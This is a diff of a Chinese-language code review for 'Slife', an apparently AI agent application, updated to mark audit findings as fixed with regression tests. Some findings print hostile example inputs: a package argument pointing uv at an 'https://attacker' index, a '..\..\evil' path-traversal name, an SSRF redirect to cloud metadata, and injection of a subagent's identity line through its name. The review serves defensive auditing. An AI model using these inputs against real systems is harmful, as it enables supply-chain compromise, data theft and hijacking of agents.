@@ -1,8 +1,8 @@
 # Slife Code Review
 
-**日期:** 2026-08-16 · **基线:** 1976 tests pass（本机全绿，本地运行确认）· **范围:** 全新全库评审，8 个并行子系统（memdb / agent core / tools / a2a / mcp / ui / subagent+plugins / core-infra），高危项已逐条复核到源码（标注 ✓）。
+**日期:** 2026-08-16 · **基线:** 1994 tests pass（本机全绿，本地运行确认）· **范围:** 全新全库评审，8 个并行子系统（memdb / agent core / tools / a2a / mcp / ui / subagent+plugins / core-infra），高危项已逐条复核到源码（标注 ✓）。
 
-> 这是旧 `REVIEW.md`（2026-08-13）删除后的全新评审。上一轮已修复的项（memdb 连接泄漏、20% 硬上限、count_turns 括号、FTS5 UPDATE 触发器、gguf 阻塞、restore 图片、M5–M7 搜索加固等）已复核为关闭。以下为**当前仍存在的问题**，按严重度排序。
+> 这是旧 `REVIEW.md`（2026-08-13）删除后的全新评审。**第 1 节高危（4 项）与第 2 节中危（全部）已修复**（2026-08-16，含回归测试）；唯一 deferred 是跨重连 in-flight 任务无重发（设计级）。以下第 3 节为**当前仍存在的低危项**。
 
 ---
 
@@ -17,56 +17,61 @@
 
 ## 2. 中危（真实路径上的错误行为）
 
+> ✅ 本节已全部修复（2026-08-16），含回归测试。唯一 deferred 项：跨重连 in-flight 任务无重发（设计级，见下）。
+
 ### a2a / 网格
-- **超时后迟到结果把记录从 failed 翻回 completed 并自动推送假完成** — `a2a/client.py:315-320,677-693` + `task_store.py:130-135`：`record_result` 只保护 `cancelled`，不保护 `failed`。短超时任务对慢 peer：调用方拿到 `TimeoutError` 且记录 failed，之后结果到 → 翻回 completed、进 `_completed_tasks`、`_notify_task_result` 自动推送 → 代理被同时告知"超时"和"成功"。**修复:** `record_result` 拒绝覆盖 `failed`，或超时后改异步可检索。
-- **CONNACK 失败（拒绝/鉴权错）当成功** — `a2a/mqtt.py:257-275`：`_on_connect` 无视 `reason_code.is_failure` 置 `_connected=True`。broker 拒绝（TCP 探测仍过 → A2A 开启）→ connect 返回"已连接"、后续 publish 全失败、只记 info 日志，代理在网格上不可见但报健康。**修复:** `_connected = not reason_code.is_failure`。
-- **connect 失败泄漏已连上的 adapter/paho 线程** — `plugins/a2a/server.py:98-104`：`DuplicateAgentError`/subscribe 失败时已连接的 adapter 从不 disconnect，每次重试堆叠新 client/线程。
-- **`_poll_tasks` 无界增长** — `plugins/a2a/server.py:77,139-149`：poll 模式的 corr_id 只在结果到达时移除；对死 peer 发 N 个 async 任务即单调泄漏。
-- **`merged` 队列无背压（client.py:550）**、**drop-oldest 静默丢入站任务（server.py:112-122）**、**`_connected` paho 线程/loop 竞态（mqtt.py:79,324,421）**、**跨重连无 in-flight 重发（client.py:466-475）** — 见第 4 节。
+- **✅ 超时后迟到结果把记录从 failed 翻回 completed 并自动推送假完成** — `task_store.py:130-135` `record_result` 只保护 `cancelled`，`failed` 会被迟到结果翻回 → 现在 `failed` 同 `cancelled` 都是终态，`_handle_result` 对 `rec.status == "failed"` 的迟到结果直接跳过（不存 `_completed_tasks`、不自动推送）。回归：`test_record_result_does_not_overwrite_failed`。
+- **✅ CONNACK 失败（拒绝/鉴权错）当成功** — `a2a/mqtt.py` `_on_connect` 先查 `reason_code.is_failure` → 置 `_connected=False`、唤醒等待者；`connect()` 等待后若 `_connected` 仍 False → 清理 paho 线程并抛 `RuntimeError`。回归：`test_connect_refused_raises`、`test_on_connect_connack_failure_not_connected`。
+- **✅ connect 失败泄漏已连上的 adapter/paho 线程** — `plugins/a2a/server.py` `_ensure_connected` 的 `client.connect()` 失败时 `try/except → client.disconnect()`，不再堆叠。
+- **✅ `_poll_tasks` 无界增长** — 超过 `_MAX_QUEUED` 时弹出任意元素（`set.pop()`）再添加。
+- **✅ `merged` 队列无背压（client.py:550）** — 给 `asyncio.Queue(maxsize=1000)`，慢 handler 时 forward 任务阻塞，把背压传导回有 drop-newest 策略的订阅队列。
+- **✅ drop-oldest 静默丢入站任务（server.py:112-122）** — 四处 drop-oldest 均加 `logger.warning("a2a_inbound_overflow …")`，不再静默。
+- **✅ `_connected` paho 线程/loop 竞态（mqtt.py）** — `_on_connect` 前置 `if self._closed or client is not self._client: return`，关闭后的陈旧回调不再把 `_connected` 复活指向死 client。
+- **⚠️ 跨重连无 in-flight 重发（client.py:466-475）** — 设计级（持久会话/消息重放会引入重复投递与 session-id 冲突风险），**deferred**，未在本次改动。
 
 ### memdb
-- **semantic drainer 任务静默死亡** — `semantic.py:247`：`_process_batch()` 不包 try/except；`messages` 是坏 JSON 时 `store.py:849` `json.loads` 抛 ValueError → 任务死、`_enabled` 仍 True、门锁死。
-- **空白 turn 永远跳过 → 索引永久卡死** — `semantic.py:288-294`：`if not embed_text.strip(): continue` 不写 chunk，`count_unembedded()` 恒 >0，20 批 no-progress 后 drainer 永久放弃（`_enabled=False`），语义门锁死到手动重开。空 user_message / 只有 user role 的 turn 触发。
-- **`count_turns` fts5 分支不做 CJK 路由 → count 与 search 结果不一致** — `store.py:400-401`：`search_keyword` 对 CJK 走 `_search_like`，`count_turns(mode=fts5)` 恒走 `_to_fts5_query` MATCH → `memory_count("今天天气…")=0` 而 `memory_search` 有命中。sibling-fix 缺口。
-- **`load()` 在 cancel 时孤儿化 → 之后所有 enable()/load() 永久挂起** — `embeddings.py:426-443`：CancelledError（BaseException）逃出 `except Exception`，`_loading` future 永不解锁 → 后续 `load()` 卡死且占着 `_enable_lock`。
-- **`replace_embedding_chunks` 原子性在共享连接并发提交下不成立** — `store.py:772-808`：`_write_lock` 只串行化 drainer；`save_turn` 的 `commit()` 可落在 DELETE 与 INSERT 之间，把替换劈成两个事务。
+- **✅ semantic drainer 任务静默死亡** — `semantic.py:_drain_loop` 包住 `_process_batch()` 的 `try/except`，异常计为 no-progress，M7 上限后响亮停转，不再无痕死任务。
+- **✅ 空白 turn 永远跳过 → 索引永久卡死** — `count_unembedded`/`get_unembedded_docs` 新增 `_EMBEDDABLE_TEXT` 条件：user_message 与 messages 均为空/`[]` 的 turn 不再计入 unembedded，语义门能打开。回归：`test_count_unembedded_excludes_empty_turns`。
+- **✅ `count_turns` fts5 分支不做 CJK 路由** — `mode == "fts5" and _contains_cjk(query)` → 改走 LIKE/grep 计数，与 `search_keyword` 一致。回归：`test_count_fts5_with_cjk_routes_to_like`。
+- **✅ `load()` 在 cancel 时孤儿化** — `embeddings.py:load()` 改 `try/except/finally`：finally 必 resolve `_loading` 并置 None，CancelledError 不再锁死后续 enable()/load()。
+- **✅ `replace_embedding_chunks` 原子性** — store 级 `asyncio.Lock`（`_write_lock`）串行化所有共享连接上的写者（`save_turn`/`update_summary`/`replace_embedding_chunks`/`_clear_chunks`/`clear_all_embeddings`），一个协程的 `commit()` 不再劈开另一个的多语句事务。
 
 ### agent 核心
-- **`_async` 后台工具在 `ctx.conversation` 恢复后执行 → 打到错误会话** — `loop.py:811-812,901-905`：`schedule_async` 的任务在 `_execute_tools` finally 恢复 `ctx.conversation` 之后才跑；WeChat/远端回合里 `include_image(_async=true)` 注入到 human 会话。
-- **`count_tokens` 低估多模态消息** — `conversation.py:362-374`：list content 用 `len(content)`（部件数≈1-3）而非字符数；`images` 键在 `to_openai_messages` 已 pop，估计分支永不触发 → 图片重上下文几乎不算 token，trim 门/`extract_oldest_turns` 严重低估。
-- **模型切换后 WeChat 持久会话仍用旧系统提示；`_last_usage` 未清** — `service.py:299-338`：`reload_active_model` 只重写 human 会话 `messages[0]`；`_convs[WECHAT]` 保留旧 model/vision/窗口%；切模型后状态栏/trim 门按旧窗口报 restore 期估值。
-- **工具参数 JSON 损坏静默变 `{}`** — `loop.py:383-399`：`_build_tool_calls_from_deltas` 吞 `JSONDecodeError`，`max_tokens` 截断半截 JSON 时 `execute_shell(command=…)` 变 `execute_shell()` 空参执行，无任何告警。
-- **回滚 turn 重复保存上一条相同 turn** — `service.py:1436-1452` + `inbox.py:286-292`：内容过滤 400 后 `pop_last_turn()` + finally 仍 `save_to_memory`；后向匹配命中**上一条**文本相同的 user 消息（心跳内容恒定）→ 把旧轮 messages 另存为重复 diary 行，token_count 双计。
-- **空 assistant content 仍持久化并重发（OpenAI 后端 400）** — `loop.py:1047-1050`：reasoning-only/max_tokens 截断 → `add_assistant_message("")`，下轮 `_oa_msgs_to_anthropic` 对 OpenAI 格式发出空 content 被拒。Anthropic 端已补空 text block，OpenAI 端没有。
+- **✅ `_async` 后台工具打到错误会话** — `loop.py` 的 async 分支用闭包把 `_ctx.conversation` 钉到本回合会话（`_run_with_conv` 临时替换、finally 还原）。
+- **✅ `count_tokens` 低估多模态** — list content 按 part 处理：text part 计字符、`image_url` part 计固定 200 token，base64 不再被当作文本占满窗口。
+- **✅ 模型切换后 WeChat 持久会话仍用旧系统提示** — `ConversationStore.update_system_prompt()` 更新 `_system_prompt` 及全部现有持久会话；`reload_active_model` 调用之，并清零 `_last_usage`。
+- **✅ 工具参数 JSON 损坏静默变 `{}`** — `_build_tool_calls_from_deltas` 的 `JSONDecodeError` 分支记 `warning("tool_args_malformed …")`，不再无声。
+- **✅ 回滚 turn 重复保存上一条相同 turn** — `inbox.py` 内容过滤回滚时置 `rolled_back=True`，finally 的 `_on_turn_complete` 跳过保存。
+- **✅ 空 assistant content 仍持久化并重发** — `openai.py` 新增 `_normalize_messages`：wire 副本中空 content 且无 tool_calls 的 assistant 消息补 `"…"` 占位（不改存储），OpenAI 格式不再 400。
 
 ### UI
-- **`_tool_widgets.clear()` 孤儿化并发流式消息的进行中工具行** — `app.py:747`：每条新消息入队时清空共享 dict，前一条还在流式的 `on_tool_result` 找不到 widget → 工具行永远"◌ running"、结果静默丢弃。
-- **model picker 与审批框焦点互抢 → 泄漏任务、Ctrl+S 永久失效** — `app.py:426-470` + `handler.py:187-204`：picker 打开时审批框 `prompt.focus()` 抢焦点 → picker future 永不 resolve、`_model_picker_open` 卡 True；反向 Ctrl+S 抢审批焦点 → Esc 取消的是 picker 不是审批。重入守卫只防连按 Ctrl+S，不防对向。
-- **✓ `image_utils.py:69` 文件名经 `Content.from_markup`** — `_fallback_widget` 把 `path.name` 拼进 markup，`[` 触发 `MarkupError` → 该轮静默死亡（inbox 兜底 except 吞掉）。旧评审遗留未修，文件名应走 `from_text(markup=False)`。
-- **多条用户图片在同一 compositor pass 挂载 → 只画最后一张** — `chat.py:141-147` + `restore.py:496-538`：工具图片走 `_schedule_image_mounts` 错峰，用户图片（含 restore）绕过，前 N-1 张留空白。
-- **审批框可无限阻塞 loop；Esc 取消不清 pending 审批** — `handler.py:187-204` + `loop.py:784-786`：`on_tool_approval` 无 `_cancel_event` 检查，失去焦点后整轮挂死、后续消息排队；Esc 只设 cancel 标志，loop 仍 await future。建议取消时 resolve(deny)。
+- **✅ `_tool_widgets.clear()` 孤儿化进行中工具行** — clear 移到 `_process_message` 的 `finally`（回合真正结束后），跟随消息的 worker 不再清掉前一回合仍在流式的 widget。
+- **✅ model picker 与审批框焦点互抢** — 双向防护：`on_tool_approval` 打开前若 picker 开着则 `_dismiss_model_picker()`（resolve None + 复位标志）；`action_switch_model` 打开 picker 前先 `_decide(False)` 关掉挂起的审批框。
+- **✅ `image_utils.py:69` 文件名经 `Content.from_markup`** — `_fallback_widget` 用 `rich.markup.escape(path.name)`，`[` 不再抛 `MarkupError` 杀死整轮。
+- **✅ 多条用户图片只画最后一张** — `ChatView._schedule_thumbnails` 逐 compositor 周期挂载（首个也延迟一个 gap），live 与 restore 共用 `add_user_message` 路径一并修复。
+- **✅ 审批框可无限阻塞 loop；Esc 取消不清 pending 审批** — loop 新增 `_await_approval`：`asyncio.wait({approval, cancel_event})`，取消先到则 deny 并让取消流程继续；`on_tool_approval` 捕获 CancelledError 时 resolve 自身 prompt 为 denied，不留悬空 future。
 
 ### tools / 配置
-- **✓ `config_env_set` 把字面 `${VAR}` 写进 `os.environ`** — `tools/config.py:108`：`value="${DEEPSEEK_API_KEY}"` 时 runtime env 拿到模板串，API 客户端本会话即失效，"立即生效"承诺对推荐 secret 路径失效（重启才行）。应解析后写 env、落盘保留 ref。
-- **✓ `install_python_package` 无 `--` 守卫的 argv 注入** — `tools/exec.py:296-297`：`create_subprocess_exec("uv","pip","install","--python",sys.executable,*packages)`；`packages=["--index-url","https://attacker","requests"]` 被当 uv 旗标 → 供应链重定向进 slife 解释器。
-- **sanitize 覆盖缺口：Basic auth / `github_pat_` / `Authorization: Token`** — `logfmt.py:301` 头模式只匹配 `(Authorization|Bearer)\s+token`；`Authorization: Basic …`、`Authorization: Token …`、`github_pat_…`（`\bgh[psu]_` 不匹配）全放行。
-- **sanitize 误伤合法内容** — `logfmt.py:317` `_URL_CREDENTIAL_PATTERN` 的 `[^@\s]+` 含 `/`（`https://host:8080/user@domain` → 吞 `8080/user`）；`[^\s]{6,}` 含引号/括号（JSON `{"api_key": "sk-…"}` 吞到 `"}`）。真实 stderr/log 文本被破坏。
-- **config env 值未经 sanitize 直接进日志** — `__init__.py:90-97`：`DATABASE_URL: postgres://…` / `MONGO_URI` / `REDIS_URL`（键名不含 SECRET/TOKEN 子串）DEBUG 全量落盘，连接串凭据外泄；脱敏键也暴露首尾 4 字符。
-- **`${VAR:-default}` 绕过 credstore 回退** — `config.py:57-66` + `env.py:23-35`：`resolve_env` 先于 `_resolve_secret`，缺 env 时先填字面默认 → credstore 持有的 key 永远走不到。"shell > credstore > literal" 文档序被 `:-default` 形式破坏（provider/model/MCP 同路径）。
-- **文档宣称的 `python -m slife myconf.json5` 自定义配置路径被忽略** — `__main__.py:13-21` + `__init__.py:25-44`：不读位置参数，相对路径也丢弃 → 静默加载默认配置、无报错。
-- **POSIX 下播种的配置文件 0644 世界可读** — `config.py:831` `shutil.copy` 保留包模板 mode，后续 `write_config` 也保留宽松权限；明文 API key 落盘后本机任意账户可读。
+- **✅ `config_env_set` 把字面 `${VAR}` 写进 `os.environ`** — 新增 `_immediate_env_value`：裸 `${VAR}` 经 `_resolve_secret`（os.environ → credstore）解析后写入 env；不可解析返回 None（不动 env）；混插走 `resolve_env`。
+- **✅ `install_python_package` 无 `--` 守卫** — `create_subprocess_exec(…, "--", *packages)`，`--index-url` 之类不再被当 uv 旗标。
+- **✅ sanitize 覆盖缺口：Basic auth / `github_pat_` / `Authorization: Token`** — 头模式改 `(?:Authorization\s*:\s*)?(?:Basic|Bearer|Token)\s+<token{8,}>`；新增 `\bgithub_pat_[A-Za-z0-9_]{20,}\b`。回归：`test_basic_auth_header_redacted` 等 4 个。
+- **✅ sanitize 误伤合法内容** — URL 凭据模式密码类排除 `/`（`host:8080/user@domain` 不再被吞）；key=value 值类排除引号/括号/花括号（JSON 不再被截烂）。回归：`test_port_url_not_corrupted`、`test_json_api_key_not_mangled`。
+- **✅ config env 值未经 sanitize 直接进日志** — `__init__.py` 全部 env 值先过 `sanitize_secrets`，再对未命中的凭证命名键（KEY/SECRET/TOKEN/PASSWORD）回退 key-name 掩码；连接串（`DATABASE_URL=postgres://user:pass@…`）只露 `<MASKED>` 密码。
+- **✅ `${VAR:-default}` 绕过 credstore 回退** — `env.py:resolve_env` 的 `${VAR:-default}` 替换在默认值之前先查 credstore，文档序 "shell > credstore > literal" 成立。
+- **✅ `python -m slife myconf.json5` 自定义路径被忽略** — 新增 `parse_cli_config_path`（跳过 `--headless`/`--agent <v>`）；`main()` 对显式路径（位置参数或参数）解析相对 CWD 并用其父目录作数据目录。
+- **✅ POSIX 下播种配置 0644 世界可读** — `_seed_first_run_config` 复制模板后 `os.chmod(path, 0o600)`。
 
 ### subagent / wechat / memfiles
-- **✓ `subagent_name` 无字符校验 → 身份注入 + 日志文件名路径穿越** — `subagent/process.py:124,502-504`：名进 `SLIFE_SUBAGENT_NAME` → `subagent.j2` "You are {{ name }}"（注入子代理身份行）；又经 headless 进 `server_utils.py:150` `f"{ts}_{agent}_subagent_{name}.log"`，`..\..\evil` 穿出日志目录。应白名单 `[A-Za-z0-9_-]` + 长度上限。
-- **超时同步任务的迟到结果被丢弃，与"结果自动送达"承诺矛盾** — `subagent/process.py:227` + `tools/subagent.py:273`：`send_task` 超时把 rpc_id 加 `_cancelled` 并抛 TimeoutError；`_dispatch_message` 对 cancelled id 直接丢弃迟到响应。工具文案说会送达、实际丢。
-- **reader EOF 未扣 `_inflight` → worker 永久 busy** — `subagent/process.py:377-383`：`_read_stdout` finally 给 pending futures 置异常但不减 `_inflight`；child 死后 `is_busy` 恒 True，后续任务全部转 async 排队到死 worker。
-- **任务超时从不杀/重启 worker；被弃任务阻塞串行队列** — `subagent/process.py:217-231`：超时后 child 继续串行处理该任务，后续任务无界堆积，无超时驱动回收。
-- **wechat 去重误删跨轮真实重复消息** — `wechat/server.py:129-178`：`_seen_keys` 跨 poll 持久，`batch_seen` 只放行同 poll 内重复；用户 >3s 间隔连发"收到"第二条被当重投丢弃。
-- **memfiles SSRF 守卫不复查重定向跳** — `memfiles/server.py:592-609`：只校验初始 host，`allow_redirects=True` 直取跳转目标（`http://public/r` 302 → `169.254.169.254` 元数据被取并公开共享）。文档自认，DNS-rebinding TOCTOU 亦在。
-- **memfiles tunnel 掉线后仍报 active（无持续健康探测）** — `tunnel.py:244-273`：`_run_monitor` 是 2s 一次性重试；`status()` 只看 `_public_url`，ngrok 会话被端侧回收后 share URL 全 404 但 `__tunnel_status`/`expose_file` 仍报 active。
+- **✅ `subagent_name` 无字符校验 → 身份注入 + 路径穿越** — `spawn` 用 `_SAFE_SUBAGENT_NAME = ^[A-Za-z0-9][A-Za-z0-9_.-]{0,63}$` 校验，注入的父代理既不能伪造身份行也不能 `..\` 穿出日志目录。
+- **✅ 超时同步任务的迟到结果被丢弃，与承诺矛盾** — 超时改加 `_late_results`（不再进 `_cancelled`），迟到响应存入 `_async_results` 可经 `get_task_result` 取回、不自动推送；工具文案改为如实说明（preempted、不自动送达）。
+- **✅ reader EOF 未扣 `_inflight` → worker 永久 busy** — `_read_stdout` finally 清零 `_inflight`，死 worker 不再永久 busy。
+- **✅ 任务超时从不预占；被弃任务阻塞串行队列** — 抽 `_send_child_cancel()`（`worker/cancel` 通知），`send_task` 超时与 `cancel_task` 共用，预占卡住的任务释放队列。
+- **✅ wechat 去重误删跨轮真实重复消息** — `_seen_keys` 由 `set` 改 `dict[key→monotonic]`，仅在 `_DEDUP_WINDOW=30s` 内视为重投；跨轮真实重复不再被丢弃。回归：`test_non_text_does_not_burn_key` 更新。
+- **✅ memfiles SSRF 不复查重定向跳** — `url_save` 手动跟随重定向（`allow_redirects=False` + `urljoin`），每跳都重跑 `_reject_non_public_url`，链上限 5；`raw is None` 报 too many redirects。（DNS-rebinding TOCTOU 仍为已知限制。）
+- **✅ memfiles tunnel 掉线后仍报 active** — `_run_monitor` 改持续健康循环：每 `_HEALTH_INTERVAL=30s` 经 `_tunnel_alive`（`ngrok.get_tunnels()`）探活，掉线则清 `_public_url` 并重启。回归：`test_restarts_when_tunnel_dropped`。
 
 ### MCP
-- **`disconnect()` 不串行化在途 `connect()` → 孤儿进程 + 泄漏监控** — `plugins/mcp/connection.py:754-771` vs `167-196`：OAuth/慢连接期间 `mcp_remove`/`shutdown` 只 pop 清理，connect 恢复后照常 spawn + 起 `_health_monitor`，池里无人引用 → 永久泄漏。只修了 monitor 发起的重连路径，`call_tool` 懒重连/`mcp_set_enabled` 触发的 connect 不受保护。
+- **✅ `disconnect()` 不串行化在途 `connect()` → 孤儿进程 + 泄漏监控** — 新增 `_disconnecting` 标志：`disconnect()` 置位后持 `_connect_lock`（等在途 connect 在其检查点中止），再取消 monitor + cleanup；`connect()` 在锁内、OAuth 后、起 monitor 前各查一次标志，中止则置 DISCONNECTED 返回，不再 spawn 孤儿 transport/monitor。
 
 ## 3. 低危（边角 / 资源增长 / 展示 / 卫生）
 
@@ -84,7 +89,7 @@
 
 ## 4. 测试与 CI
 
-- **基线:** 1976 tests 本地全绿（上一轮 1881）。CI 在 Ubuntu/macOS/Windows × Python 3.13 上 build wheel 后对 wheel 跑测试（wheel 确被真实执行，非旧评审的悬置项）。
+- **基线:** 1994 tests 本地全绿（修复后，1976 → 1994，新增 ~18 条回归测试）。CI 在 Ubuntu/macOS/Windows × Python 3.13 上 build wheel 后对 wheel 跑测试（wheel 确被真实执行，非旧评审的悬置项）。
 - **仍未覆盖:** 无覆盖率门槛（`[tool.coverage]` 已配置但 CI 不跑 `--cov`）；无 subagent 真实子进程集成测试；无 OAuth/wechat/ngrok 真实链路集成测试；安装脚本无冒烟测试。
 - **本轮新确认的"单元测试没拦住"的重灾区:** OAuth 设备码轮询用已关闭 client（HIGH）、配置读失败清空文件（HIGH）、图片 note 破坏 save_to_memory 匹配（HIGH）——都缺回归测试。
 
@@ -103,8 +108,8 @@
 - 源码里仍散落 ~70 处 `(REVIEW §…/C…/H…/M…)` 注释指向已删除的旧文档 —— 悬空引用，建议随改动逐步清理（未在本轮动，避免污染评审 diff）。
 - `slife.db(-wal/-shm)`、`.coverage`、`credentials.crypt`、`logs/`、`Jack.db*` 均为本地未跟踪数据，保持不提交。
 
-## 本轮最该先修的三件事
+## 修复进度（2026-08-16）
 
-1. **OAuth 轮询已关闭 client**（第 1 节 #1）——功能不可用，一行修复级。
-2. **配置读失败清空文件**（第 1 节 #2）——静默丢全部配置，两条路径同一根。
-3. **带坏图片的 turn 不落库**（第 1 节 #3）——高频误触发路径上的静默丢数据。
+- **第 1 节高危：4/4 已修复** —— OAuth 轮询、配置读失败清空、坏图片 turn 不落库、presence 注入。
+- **第 2 节中危：全部已修复**（a2a 8 项含 deferred 说明、memdb 5、agent core 6、UI 5、tools/config 8、subagent/wechat/memfiles 7、MCP 1），每项带回归测试。
+- **第 3 节低危：仍开放** —— 无界增长（`_usage_by_conv`/`_context_turn_dates`/各队列缓存）、展示与边角问题，见上。
